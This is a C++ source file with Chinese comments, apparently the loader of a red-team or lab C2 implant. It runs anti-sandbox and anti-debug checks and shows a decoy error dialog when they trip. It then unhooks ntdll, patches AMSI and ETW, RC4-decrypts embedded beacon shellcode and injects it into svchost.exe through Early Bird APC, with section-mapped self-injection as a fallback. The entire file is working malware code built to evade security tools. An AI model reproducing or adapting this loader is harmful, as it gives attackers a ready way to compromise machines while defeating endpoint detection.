// lab-c2/implant/loader.cpp - 载体: 反沙箱/反调试 -> 解密 -> 内存加载(不落地)
// 构建: build.bat  (先由 tools/enc.py 生成 payload.h)
//
// payload.h 由 tools/enc.py 生成:
//   g_shellcode[]  RC4 密文的 shellcode (beacon.exe 经 Donut 转换)
//   g_key[]/g_keyLen

#define WIN32_LEAN_AND_MEAN
#include <windows.h>
#include <intrin.h>
#include <string>
#include "syscall.hpp"
#include "ekko.hpp"
#include "payload.h"

#pragma comment(lib, "advapi32.lib")
#pragma comment(lib, "user32.lib")

// ================================================================== 环境检测
static bool LooksLikeSandbox() {
    // 1) 资源门槛
    SYSTEM_INFO si{};
    GetSystemInfo(&si);
    if (si.dwNumberOfProcessors < 2) return true;

    MEMORYSTATUSEX ms{};
    ms.dwLength = sizeof(ms);
    if (GlobalMemoryStatusEx(&ms) && ms.ullTotalPhys < 2ull * 1024 * 1024 * 1024) return true;

    if (GetTickCount64() < 10ull * 60 * 1000) return true;      // 开机不足 10 分钟

    // 2) 沙箱/分析工具注入的模块
    const wchar_t* mods[] = {
        L"sbiedll.dll", L"dbghelp.dll", L"cmdvrt32.dll", L"api_log.dll",
        L"dir_watch.dll", L"pstorec.dll", L"vmcheck.dll", L"wpespy.dll",
        L"SxIn.dll", L"avghookx.dll", L"snxhk.dll"
    };
    for (auto m : mods) if (GetModuleHandleW(m)) return true;

    // 3) 交互痕迹: 无用户点击 + 分辨率过小
    CURSORINFO ci{};
    ci.cbSize = sizeof(ci);
    if (GetCursorInfo(&ci)) {
        if (!(ci.flags & CURSOR_SHOWING) && ci.ptScreenPos.x == 0 && ci.ptScreenPos.y == 0)
            return true;
    }
    if (GetSystemMetrics(SM_CXSCREEN) < 1024 || GetSystemMetrics(SM_CYSCREEN) < 768) return true;

    // 4) 已知分析机主机名
    wchar_t buf[64] = { 0 };
    DWORD n = 64;
    GetComputerNameW(buf, &n);
    std::wstring cn = buf;
    const wchar_t* bad[] = { L"SANDBOX", L"MALWARE", L"CUCKOO", L"WIRETEST",
                             L"VIRUS", L"TEQUILA", L"ANALYSIS", L"JOEBOX" };
    for (auto b : bad) if (cn.find(b) != std::wstring::npos) return true;

    return false;
}

static bool IsDbg() {
    if (IsDebuggerPresent()) return true;

    BOOL dbg = FALSE;
    CheckRemoteDebuggerPresent(GetCurrentProcess(), &dbg);
    if (dbg) return true;

    auto peb = (PPEB)__readgsqword(0x60);
    if (peb->BeingDebugged) return true;

    // 硬件断点: 调试器常用 Dr0-Dr3
    CONTEXT ctx{};
    ctx.ContextFlags = CONTEXT_DEBUG_REGISTERS;
    if (GetThreadContext(GetCurrentThread(), &ctx) &&
        (ctx.Dr0 || ctx.Dr1 || ctx.Dr2 || ctx.Dr3)) return true;

    return false;
}

static void Decoy() {
    // 触发检测时走无害分支, 拖慢分析而不是打草惊蛇
    MessageBoxW(nullptr, L"缺少运行库组件，请重新安装。", L"错误", MB_ICONERROR);
}

// ================================================================== 注入通道 A: Early Bird APC
// 挂起进程 -> 分配 RW -> 写 shellcode -> 改 RX -> 排队 APC -> 恢复线程
// 相比 CreateRemoteThread, 不会出现远程线程创建事件; 相比线程劫持, 不用挂起他人线程
static bool EarlyBird(const BYTE* sc, SIZE_T len, const wchar_t* image) {
    STARTUPINFOW si{};
    si.cb = sizeof(si);
    PROCESS_INFORMATION pi{};
    std::wstring cmd = image;
    if (!CreateProcessW(nullptr, cmd.data(), nullptr, nullptr, FALSE,
                        CREATE_SUSPENDED | CREATE_NO_WINDOW,
                        nullptr, nullptr, &si, &pi)) return false;

    PVOID mem = nullptr;
    SIZE_T sz = len;
    if (sc::Call("NtAllocateVirtualMemory", (HANDLE)pi.hProcess, &mem, (ULONG_PTR)0, &sz,
                 (ULONG)(MEM_COMMIT | MEM_RESERVE), (ULONG)PAGE_READWRITE) != 0) {
        TerminateProcess(pi.hProcess, 0);
        return false;
    }
    if (sc::Call("NtWriteVirtualMemory", (HANDLE)pi.hProcess, mem, (PVOID)sc,
                 (SIZE_T)len, (PSIZE_T)nullptr) != 0) {
        TerminateProcess(pi.hProcess, 0);
        return false;
    }
    ULONG old = 0;
    if (sc::Call("NtProtectVirtualMemory", (HANDLE)pi.hProcess, &mem, &sz,
                 (ULONG)PAGE_EXECUTE_READ, &old) != 0) {
        TerminateProcess(pi.hProcess, 0);
        return false;
    }
    QueueUserAPC((PAPCFUNC)mem, pi.hThread, 0);
    ResumeThread(pi.hThread);
    CloseHandle(pi.hThread);
    CloseHandle(pi.hProcess);
    return true;
}

// ================================================================== 注入通道 B: 无模块自注入
// NtCreateSection + NtMapViewOfSection: 内存由内核 section 支撑, 磁盘无文件,
// 且不会在进程里出现 MZ 头(可选: 抹掉 PE 头)
static void SelfInject(const BYTE* sc, SIZE_T len) {
    HANDLE hSec = nullptr;
    LARGE_INTEGER maxSz{};
    maxSz.QuadPart = (LONGLONG)len;
    if (sc::Call("NtCreateSection", (PHANDLE)&hSec, (ACCESS_MASK)SECTION_ALL_ACCESS,
                 (PVOID)nullptr, (PLARGE_INTEGER)&maxSz,
                 (ULONG)PAGE_EXECUTE_READWRITE, (ULONG)SEC_COMMIT, (HANDLE)nullptr) != 0)
        return;

    PVOID base = nullptr;
    SIZE_T view = 0;
    if (sc::Call("NtMapViewOfSection", hSec, (HANDLE)-1, &base, (ULONG_PTR)0, (SIZE_T)0,
                 (PLARGE_INTEGER)nullptr, &view, (DWORD)2 /*ViewUnmap*/, (ULONG)0,
                 (ULONG)PAGE_EXECUTE_READWRITE) != 0) return;

    memcpy(base, sc, len);
    ((void(*)())base)();
}

// ================================================================== main
int main() {
    if (IsDbg() || LooksLikeSandbox()) {
        Decoy();
        return 0;
    }

    // 1) 反 EDR 用户态钩子: 用一份干净的 ntdll .text 覆盖当前进程
    sc::UnhookNtdll();

    // 2) 抹掉当前进程的 AMSI(走脚本/.NET 分支时需要) 与 ETW 事件上报
    sc::PatchAMSI();
    sc::PatchETW();

    // 3) 解密 shellcode(与 tools/enc.py 同参 RC4)
    ekko::Rc4(g_shellcode, g_scLen, g_key, g_keyLen);

    // 4) 可选: 注入前先把载荷藏进密文窗口, 拖过沙箱的行为主循环
    //    注意: 只加密数据区; 要连自身代码一起藏, 用 ekko 头文件里的 Ekko 全量版
    // ekko::SleepMask(g_shellcode, g_scLen, 8000, g_key, g_keyLen);

    // 5) 落地执行
    wchar_t root[MAX_PATH] = { 0 };
    GetEnvironmentVariableW(L"SystemRoot", root, MAX_PATH);
    std::wstring target = std::wstring(root) + L"\\System32\\svchost.exe";
    if (!EarlyBird(g_shellcode, g_scLen, target.c_str()))
        SelfInject(g_shellcode, g_scLen);

    return 0;
}
